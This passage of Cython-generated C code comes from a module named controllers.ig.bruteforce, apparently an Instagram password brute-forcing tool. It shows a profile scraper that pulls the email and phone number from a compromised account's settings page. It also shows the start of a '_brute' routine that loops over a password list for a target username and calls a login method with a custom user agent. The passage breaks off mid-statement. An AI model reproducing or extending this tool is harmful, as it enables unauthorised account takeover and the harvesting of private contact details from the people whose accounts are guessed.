        __pyx_t_6 = 0;

         
        goto __pyx_L43_try_break;

         
      }
      __pyx_L38_error:;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

       
      __Pyx_ErrFetch(&__pyx_t_6, &__pyx_t_1, &__pyx_t_10);
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_ConnectionError); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 201, __pyx_L40_except_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_Timeout); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 201, __pyx_L40_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_ChunkedEncodingError); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 201, __pyx_L40_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_7 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_6, __pyx_t_5) || __Pyx_PyErr_GivenExceptionMatches(__pyx_t_6, __pyx_t_9) || __Pyx_PyErr_GivenExceptionMatches(__pyx_t_6, __pyx_t_8);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_ErrRestore(__pyx_t_6, __pyx_t_1, __pyx_t_10);
      __pyx_t_6 = 0; __pyx_t_1 = 0; __pyx_t_10 = 0;
      if (__pyx_t_7) {
        __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.my_profile", __pyx_clineno, __pyx_lineno, __pyx_filename);
        if (__Pyx_GetException(&__pyx_t_10, &__pyx_t_1, &__pyx_t_6) < 0) __PYX_ERR(0, 201, __pyx_L40_except_error)
        __Pyx_GOTREF(__pyx_t_10);
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_GOTREF(__pyx_t_6);

         
        goto __pyx_L47_except_continue;
        __pyx_L47_except_continue:;
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        goto __pyx_L44_try_continue;
      }

       
        {
        __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.my_profile", __pyx_clineno, __pyx_lineno, __pyx_filename);
        if (__Pyx_GetException(&__pyx_t_6, &__pyx_t_1, &__pyx_t_10) < 0) __PYX_ERR(0, 203, __pyx_L40_except_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_GOTREF(__pyx_t_10);

         
        __pyx_t_8 = PyObject_RichCompare(__pyx_v_num_retries, __pyx_int_5, Py_GE); __Pyx_XGOTREF(__pyx_t_8); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 204, __pyx_L40_except_error)
        __pyx_t_11 = __Pyx_PyObject_IsTrue(__pyx_t_8); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 204, __pyx_L40_except_error)
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        if (__pyx_t_11) {

           
          goto __pyx_L48_except_break;

           
        }

         
          {
          __pyx_t_8 = __Pyx_PyInt_AddObjC(__pyx_v_num_retries, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 207, __pyx_L40_except_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF_SET(__pyx_v_num_retries, __pyx_t_8);
          __pyx_t_8 = 0;

           
          goto __pyx_L49_except_continue;
        }
        __pyx_L48_except_break:;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        goto __pyx_L43_try_break;
        __pyx_L49_except_continue:;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        goto __pyx_L44_try_continue;
      }
      __pyx_L40_except_error:;

       
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_XGIVEREF(__pyx_t_4);
      __Pyx_ExceptionReset(__pyx_t_2, __pyx_t_3, __pyx_t_4);
      goto __pyx_L1_error;
      __pyx_L43_try_break:;
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_XGIVEREF(__pyx_t_4);
      __Pyx_ExceptionReset(__pyx_t_2, __pyx_t_3, __pyx_t_4);
      goto __pyx_L37_break;
      __pyx_L44_try_continue:;
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_XGIVEREF(__pyx_t_4);
      __Pyx_ExceptionReset(__pyx_t_2, __pyx_t_3, __pyx_t_4);
      goto __pyx_L36_continue;
    }
    __pyx_L36_continue:;
  }
  __pyx_L37_break:;

   
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_4, &__pyx_t_3, &__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_2);
      {

       
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_re); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 211, __pyx_L51_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_findall); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 211, __pyx_L51_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (unlikely(!__pyx_v_response)) { __Pyx_RaiseUnboundLocalError("response"); __PYX_ERR(0, 211, __pyx_L51_error) }
      __pyx_t_6 = NULL;
      __pyx_t_7 = 0;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_8);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_8, function);
          __pyx_t_7 = 1;
        }
      }
      #if CYTHON_FAST_PYCALL
      if (PyFunction_Check(__pyx_t_8)) {
        PyObject *__pyx_temp[3] = {__pyx_t_6, __pyx_kp_u_window__sharedData_s_s, __pyx_v_response};
        __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_8, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 211, __pyx_L51_error)
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_GOTREF(__pyx_t_1);
      } else
      #endif
      #if CYTHON_FAST_PYCCALL
      if (__Pyx_PyFastCFunction_Check(__pyx_t_8)) {
        PyObject *__pyx_temp[3] = {__pyx_t_6, __pyx_kp_u_window__sharedData_s_s, __pyx_v_response};
        __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_8, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 211, __pyx_L51_error)
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_GOTREF(__pyx_t_1);
      } else
      #endif
      {
        __pyx_t_9 = PyTuple_New(2+__pyx_t_7); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 211, __pyx_L51_error)
        __Pyx_GOTREF(__pyx_t_9);
        if (__pyx_t_6) {
          __Pyx_GIVEREF(__pyx_t_6); PyTuple_SET_ITEM(__pyx_t_9, 0, __pyx_t_6); __pyx_t_6 = NULL;
        }
        __Pyx_INCREF(__pyx_kp_u_window__sharedData_s_s);
        __Pyx_GIVEREF(__pyx_kp_u_window__sharedData_s_s);
        PyTuple_SET_ITEM(__pyx_t_9, 0+__pyx_t_7, __pyx_kp_u_window__sharedData_s_s);
        __Pyx_INCREF(__pyx_v_response);
        __Pyx_GIVEREF(__pyx_v_response);
        PyTuple_SET_ITEM(__pyx_t_9, 1+__pyx_t_7, __pyx_v_response);
        __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_t_9, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 211, __pyx_L51_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      }
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = PyUnicode_Join(__pyx_kp_u__6, __pyx_t_1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 211, __pyx_L51_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_strip); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 211, __pyx_L51_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_1);
        if (likely(__pyx_t_8)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
          __Pyx_INCREF(__pyx_t_8);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_1, function);
        }
      }
      __pyx_t_10 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 211, __pyx_L51_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_v_shared_data = __pyx_t_10;
      __pyx_t_10 = 0;

       
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_json); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 212, __pyx_L51_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_loads); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 212, __pyx_L51_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
        __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_8);
        if (likely(__pyx_t_1)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
          __Pyx_INCREF(__pyx_t_1);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_8, function);
        }
      }
      __pyx_t_10 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_1, __pyx_v_shared_data) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_v_shared_data);
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 212, __pyx_L51_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_v_json_object = __pyx_t_10;
      __pyx_t_10 = 0;

       
      __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_v_json_object, __pyx_n_u_entry_data); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 213, __pyx_L51_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_8 = __Pyx_PyObject_Dict_GetItem(__pyx_t_10, __pyx_n_u_SettingsPages); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 213, __pyx_L51_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_GetItemInt(__pyx_t_8, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 213, __pyx_L51_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Dict_GetItem(__pyx_t_10, __pyx_n_u_form_data); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 213, __pyx_L51_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_v_form_data = __pyx_t_8;
      __pyx_t_8 = 0;

       
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_12, &__pyx_t_13, &__pyx_t_14);
        __Pyx_XGOTREF(__pyx_t_12);
        __Pyx_XGOTREF(__pyx_t_13);
        __Pyx_XGOTREF(__pyx_t_14);
          {

           
          __pyx_t_8 = __Pyx_PyObject_Dict_GetItem(__pyx_v_form_data, __pyx_n_u_email); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 215, __pyx_L57_error)
          __Pyx_GOTREF(__pyx_t_8);
          if (unlikely(PyDict_SetItem(__pyx_v_results, __pyx_n_u_email, __pyx_t_8) < 0)) __PYX_ERR(0, 215, __pyx_L57_error)
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

           
        }
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
        goto __pyx_L62_try_end;
        __pyx_L57_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

         
          {
          __Pyx_ErrRestore(0,0,0);
          goto __pyx_L58_exception_handled;
        }
        __pyx_L58_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_XGIVEREF(__pyx_t_14);
        __Pyx_ExceptionReset(__pyx_t_12, __pyx_t_13, __pyx_t_14);
        __pyx_L62_try_end:;
      }

       
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_14, &__pyx_t_13, &__pyx_t_12);
        __Pyx_XGOTREF(__pyx_t_14);
        __Pyx_XGOTREF(__pyx_t_13);
        __Pyx_XGOTREF(__pyx_t_12);
          {

           
          __pyx_t_8 = __Pyx_PyObject_Dict_GetItem(__pyx_v_form_data, __pyx_n_u_phone_number); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 218, __pyx_L63_error)
          __Pyx_GOTREF(__pyx_t_8);
          if (unlikely(PyDict_SetItem(__pyx_v_results, __pyx_n_u_phone, __pyx_t_8) < 0)) __PYX_ERR(0, 218, __pyx_L63_error)
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

           
        }
        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        goto __pyx_L68_try_end;
        __pyx_L63_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

         
          {
          __Pyx_ErrRestore(0,0,0);
          goto __pyx_L64_exception_handled;
        }
        __pyx_L64_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_14);
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_13, __pyx_t_12);
        __pyx_L68_try_end:;
      }

       
    }
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    goto __pyx_L56_try_end;
    __pyx_L51_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

     
      {
      __Pyx_ErrRestore(0,0,0);
      goto __pyx_L52_exception_handled;
    }
    __pyx_L52_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_ExceptionReset(__pyx_t_4, __pyx_t_3, __pyx_t_2);
    __pyx_L56_try_end:;
  }

   
  __Pyx_XDECREF(__pyx_r);
  __Pyx_INCREF(__pyx_v_results);
  __pyx_r = __pyx_v_results;
  goto __pyx_L0;

   

   
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.my_profile", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_results);
  __Pyx_XDECREF(__pyx_v_http);
  __Pyx_XDECREF(__pyx_v_num_retries);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_shared_data);
  __Pyx_XDECREF(__pyx_v_json_object);
  __Pyx_XDECREF(__pyx_v_form_data);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

 

 
static PyObject *__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_9_brute(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds);  
static PyMethodDef __pyx_mdef_11controllers_2ig_10bruteforce_8__init___4Base_9_brute = {"_brute", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_9_brute, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_9_brute(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_self = 0;
  PyObject *__pyx_v_users = 0;
  PyObject *__pyx_v_kwargs = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("_brute (wrapper)", 0);
  __pyx_v_kwargs = PyDict_New(); if (unlikely(!__pyx_v_kwargs)) return NULL;
  __Pyx_GOTREF(__pyx_v_kwargs);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_self,&__pyx_n_s_users,0};
    PyObject* values[2] = {0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_self)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_users)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("_brute", 1, 2, 2, 1); __PYX_ERR(0, 225, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, __pyx_v_kwargs, values, pos_args, "_brute") < 0)) __PYX_ERR(0, 225, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 2) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
    }
    __pyx_v_self = values[0];
    __pyx_v_users = values[1];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("_brute", 1, 2, 2, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 225, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_DECREF(__pyx_v_kwargs); __pyx_v_kwargs = 0;
  __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base._brute", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_8_brute(__pyx_self, __pyx_v_self, __pyx_v_users, __pyx_v_kwargs);

   
  __Pyx_XDECREF(__pyx_v_kwargs);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_8_brute(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_users, PyObject *__pyx_v_kwargs) {
  PyObject *__pyx_v_rich = NULL;
  PyObject *__pyx_v_password = NULL;
  PyObject *__pyx_v_login = NULL;
  PyObject *__pyx_v_cookie = NULL;
  PyObject *__pyx_v_profile = NULL;
  PyObject *__pyx_v_root = NULL;
  PyObject *__pyx_v_account = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  Py_ssize_t __pyx_t_3;
  PyObject *(*__pyx_t_4)(PyObject *);
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  Py_ssize_t __pyx_t_8;
  int __pyx_t_9;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  PyObject *__pyx_t_14 = NULL;
  int __pyx_t_15;
  Py_UCS4 __pyx_t_16;
  int __pyx_t_17;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("_brute", 0);

   
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_rich); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 226, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_rich = __pyx_t_1;
  __pyx_t_1 = 0;

   
  __pyx_t_1 = __Pyx_PyObject_Dict_GetItem(__pyx_v_users, __pyx_n_u_password); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 227, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (likely(PyList_CheckExact(__pyx_t_1)) || PyTuple_CheckExact(__pyx_t_1)) {
    __pyx_t_2 = __pyx_t_1; __Pyx_INCREF(__pyx_t_2); __pyx_t_3 = 0;
    __pyx_t_4 = NULL;
  } else {
    __pyx_t_3 = -1; __pyx_t_2 = PyObject_GetIter(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 227, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_4 = Py_TYPE(__pyx_t_2)->tp_iternext; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 227, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  for (;;) {
    if (likely(!__pyx_t_4)) {
      if (likely(PyList_CheckExact(__pyx_t_2))) {
        if (__pyx_t_3 >= PyList_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_1); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 227, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 227, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      } else {
        if (__pyx_t_3 >= PyTuple_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_1); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 227, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 227, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      }
    } else {
      __pyx_t_1 = __pyx_t_4(__pyx_t_2);
      if (unlikely(!__pyx_t_1)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 227, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_1);
    }
    __Pyx_XDECREF_SET(__pyx_v_password, __pyx_t_1);
    __pyx_t_1 = 0;

     
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_5, &__pyx_t_6, &__pyx_t_7);
      __Pyx_XGOTREF(__pyx_t_5);
      __Pyx_XGOTREF(__pyx_t_6);
      __Pyx_XGOTREF(__pyx_t_7);
        {

         
        __pyx_t_8 = PyObject_Length(__pyx_v_password); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 229, __pyx_L5_error)
        __pyx_t_9 = ((__pyx_t_8 < 6) != 0);
        if (__pyx_t_9) {

           
          goto __pyx_L11_try_continue;

           
        }

         
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_login); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 231, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_v_users, __pyx_n_u_username); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 231, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_10);
        __pyx_t_11 = PyTuple_New(2); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 231, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_GIVEREF(__pyx_t_10);
        PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_t_10);
        __Pyx_INCREF(__pyx_v_password);
        __Pyx_GIVEREF(__pyx_v_password);
        PyTuple_SET_ITEM(__pyx_t_11, 1, __pyx_v_password);
        __pyx_t_10 = 0;
        __pyx_t_10 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 231, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_10);
        __pyx_t_12 = __Pyx_PyDict_GetItem(__pyx_v_kwargs, __pyx_n_u_user_agent); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 231, __pyx_L5_error)
